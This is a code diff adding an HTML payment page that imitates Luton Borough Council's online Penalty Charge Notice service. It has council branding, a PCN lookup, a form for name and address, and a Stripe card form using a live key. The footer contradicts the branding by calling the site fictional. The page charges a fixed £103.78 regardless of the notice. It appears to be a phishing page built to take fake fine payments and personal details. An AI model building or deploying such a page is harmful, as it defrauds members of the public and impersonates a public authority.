@@ -1,0 +1,210 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<link rel="stylesheet" href="style.css">
+<script src="https://js.stripe.com/v3/"></script></head><body>
+<header class="site-header">
+  <img class="logo" src="logo.jpeg" alt="Luton Borough Council logo">
+  <div class="site-title">
+    <div class="name">LUTON BOROUGH COUNCIL</div>
+    <div class="sub">ONLINE PAYMENTS</div>
+  </div>
+</header>
+<div class="band"></div>
+<main>
+ <div class="crumbs">
+  <a href="index.html">PCN Search</a> &gt;
+  <a href="#" id="back-link">PCN details</a> &gt;
+  <b>Payment</b>
+ </div>
+
+ <ol class="steps" id="step-bar">
+  <li class="step active" id="s-ind-1">Notice</li>
+  <li class="step" id="s-ind-2">Your details</li>
+  <li class="step" id="s-ind-3">Confirm</li>
+  <li class="step" id="s-ind-4">Done</li>
+ </ol>
+
+ <div id="loading"><p>Loading notice details…</p></div>
+
+ <div id="step1" class="step-panel" hidden>
+  <h1>Make a payment</h1>
+  <p class="lead">You are about to pay a Penalty Charge Notice.</p>
+  <dl class="details">
+   <dt>PCN number</dt><dd id="s1-pcn"></dd>
+   <dt>Vehicle registration</dt><dd id="s1-vrn"></dd>
+   <dt>Date of contravention</dt><dd id="s1-date"></dd>
+   <dt>Location</dt><dd id="s1-loc"></dd>
+   <dt>Contravention</dt><dd id="s1-con"></dd>
+   <dt>Amount due</dt><dd id="s1-amt" class="amount"></dd>
+  </dl>
+  <div class="sub-actions">
+   <button class="btn" onclick="goStep(2)">Continue</button>
+   <a class="btn secondary" id="cancel-link1" href="#">Cancel</a>
+  </div>
+ </div>
+
+ <div id="step2" class="step-panel" hidden>
+  <h1>Your details</h1>
+  <p class="lead">Please enter your details as they appear on the notice.</p>
+  <form id="details-form" class="grid" onsubmit="submitDetails(event)">
+   <div><label>First name *</label><input id="fname" required></div>
+   <div><label>Last name *</label><input id="lname" required></div>
+   <div class="full"><label>Address line 1 *</label><input id="addr1" required></div>
+   <div class="full"><label>Address line 2</label><input id="addr2"></div>
+   <div><label>Town / City *</label><input id="town" required></div>
+   <div><label>Postcode *</label><input id="postcode" required></div>
+   <div class="full"><label>Email address (for receipt)</label><input id="email" type="email"></div>
+   <div class="full sub-actions">
+    <button class="btn" type="submit">Continue</button>
+    <button class="btn secondary" type="button" onclick="goStep(1)">Back</button>
+   </div>
+  </form>
+ </div>
+
+ <div id="step3" class="step-panel" hidden>
+  <h1>Confirm payment</h1>
+  <h2>PCN details</h2>
+  <dl class="details">
+   <dt>PCN number</dt><dd id="s3-pcn"></dd>
+   <dt>Vehicle registration</dt><dd id="s3-vrn"></dd>
+   <dt>Amount to pay</dt><dd id="s3-amt" class="amount"></dd>
+  </dl>
+  <h2>Your details</h2>
+  <dl class="details">
+   <dt>Name</dt><dd id="s3-name"></dd>
+   <dt>Address</dt><dd id="s3-addr"></dd>
+  </dl>
+  <h2>Card details</h2>
+  <div class="row" style="max-width:100%">
+   <label>Card number, expiry and CVV</label>
+   <div id="card-element" style="border:1px solid #cfcfcf;padding:12px 10px;border-radius:2px;background:#fff;font-size:16px;"></div>
+   <div id="card-errors" style="color:#c0392b;font-size:14px;margin-top:6px;"></div>
+  </div>
+  <div class="sub-actions">
+   <button class="btn" id="pay-btn" onclick="handlePayment()">Pay now — <span id="s3-btn-amt"></span></button>
+   <button class="btn secondary" onclick="goStep(2)">Back</button>
+  </div>
+ </div>
+
+ <div id="step4" class="step-panel" hidden>
+  <div class="success-box">
+   <div class="tick">✓</div>
+   <h1>Payment received</h1>
+  </div>
+  <dl class="details">
+   <dt>PCN number</dt><dd id="s4-pcn"></dd>
+   <dt>Amount paid</dt><dd id="s4-amt" class="amount"></dd>
+   <dt>Payment reference</dt><dd id="s4-ref"></dd>
+   <dt>Date</dt><dd id="s4-date"></dd>
+  </dl>
+  <p>A confirmation has been sent to your email address.</p>
+  <div class="sub-actions"><a class="btn" href="index.html">Return to PCN Search</a></div>
+ </div>
+</main>
+
+<footer class="site-footer">
+  <div class="footer-cols">
+    <div><h4>Site details</h4><ul><li>Homepage</li><li>Contact us</li><li>Privacy and cookies</li></ul></div>
+    <div><h4>Quick links</h4><ul><li>Pay a PCN</li><li>Appeal a PCN</li><li>PCN Search</li></ul></div>
+    <div><h4>Connect</h4><ul><li>Stay connected</li><li>Provide feedback</li></ul>
+      <div class="footer-social">
+        <a href="#" class="twitter" aria-label="Twitter">𝕏</a>
+        <a href="#" class="facebook" aria-label="Facebook">f</a>
+      </div>
+    </div>
+  </div>
+  <div class="footer-bottom">
+    <span>© 2026 Council Parking Authority (fictional)</span>
+  </div>
+</footer>
+<script>
+const esc = s => String(s ?? '').replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+const q = new URLSearchParams(location.search);
+const vrn = q.get('vrn'), pcnNum = q.get('pcn');
+let record = null, amount = 103.78, fullName = '', fullAddr = '';
+let stripe, cardElement, clientSecret;
+
+// Init Stripe
+stripe = Stripe('pk_live_51URufYEinKzpiw9hZdbhT00lNnjwSL6Lb3TkUekXmhVHbe73QSkIXTTCOCi3BhyB5kdiyJdd773zZPJ54JmZh4r3008CP9K8on');
+const elements = stripe.elements();
+cardElement = elements.create('card', {
+  style: { base: { fontSize: '16px', fontFamily: 'Arial, sans-serif', color: '#2b2b2b' } }
+});
+
+document.getElementById('back-link').href = `pcn.html?vrn=${encodeURIComponent(vrn)}&pcn=${encodeURIComponent(pcnNum)}`;
+document.getElementById('cancel-link1').href = `pcn.html?vrn=${encodeURIComponent(vrn)}&pcn=${encodeURIComponent(pcnNum)}`;
+
+fetch('/api/lookup', {method:'POST', headers:{'Content-Type':'application/json'},
+  body: JSON.stringify({vrn, pcn: pcnNum})})
+.then(async r => {
+  document.getElementById('loading').hidden = true;
+  if (!r.ok) { document.getElementById('loading').hidden = false;
+    document.getElementById('loading').innerHTML = '<p>Could not load PCN details. <a href="index.html">Return to search</a></p>'; return; }
+  record = await r.json();
+  const date = record.date ? record.date.split('-').reverse().join('/') : '—';
+  document.getElementById('s1-pcn').textContent = record.pcn;
+  document.getElementById('s1-vrn').textContent = record.vrn;
+  document.getElementById('s1-date').textContent = date;
+  document.getElementById('s1-loc').textContent = record.location || '—';
+  document.getElementById('s1-con').textContent = record.contravention || '—';
+  document.getElementById('s1-amt').textContent = `£${amount.toFixed(2)}`;
+  document.getElementById('s3-pcn').textContent = record.pcn;
+  document.getElementById('s3-vrn').textContent = record.vrn;
+  document.getElementById('s3-amt').textContent = `£${amount.toFixed(2)}`;
+  document.getElementById('s3-btn-amt').textContent = `£${amount.toFixed(2)}`;
+  document.getElementById('s4-pcn').textContent = record.pcn;
+  document.getElementById('s4-amt').textContent = `£${amount.toFixed(2)}`;
+  document.getElementById('s4-date').textContent = new Date().toLocaleDateString('en-GB');
+  goStep(1);
+});
+
+function goStep(n) {
+  [1,2,3,4].forEach(i => {
+    document.getElementById('step' + i).hidden = (i !== n);
+    document.getElementById('s-ind-' + i).className = 'step' + (i < n ? ' done' : i === n ? ' active' : '');
+  });
+  // Mount Stripe card element when step 3 is shown
+  if (n === 3) {
+    setTimeout(() => {
+      const el = document.getElementById('card-element');
+      if (el && !el._mounted) { cardElement.mount('#card-element'); el._mounted = true; }
+    }, 50);
+    // Create payment intent
+    fetch('/api/create-payment-intent', {method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({pcn: record.pcn, vrn: record.vrn})})
+    .then(r => r.json()).then(d => { clientSecret = d.clientSecret; })
+    .catch(() => { document.getElementById('card-errors').textContent = 'Could not connect to payment service.'; });
+  }
+}
+
+function submitDetails(e) {
+  e.preventDefault();
+  fullName = document.getElementById('fname').value + ' ' + document.getElementById('lname').value;
+  const parts = [document.getElementById('addr1').value, document.getElementById('addr2').value,
+    document.getElementById('town').value, document.getElementById('postcode').value].filter(Boolean);
+  fullAddr = parts.join(', ');
+  document.getElementById('s3-name').textContent = fullName;
+  document.getElementById('s3-addr').textContent = fullAddr;
+  goStep(3);
+}
+
+async function handlePayment() {
+  const btn = document.getElementById('pay-btn');
+  const errEl = document.getElementById('card-errors');
+  errEl.textContent = '';
+  if (!clientSecret) { errEl.textContent = 'Payment not ready yet. Please wait a moment and try again.'; return; }
+  btn.disabled = true;
+  btn.textContent = 'Processing…';
+  const { error, paymentIntent } = await stripe.confirmCardPayment(clientSecret, {
+    payment_method: { card: cardElement, billing_details: { name: fullName } }
+  });
+  if (error) {
+    errEl.textContent = error.message;
+    btn.disabled = false;
+    btn.innerHTML = `Pay now — £${amount.toFixed(2)}`;
+  } else if (paymentIntent.status === 'succeeded') {
+    document.getElementById('s4-ref').textContent = paymentIntent.id;
+    goStep(4);
+  }
+}
+</script></body></html>
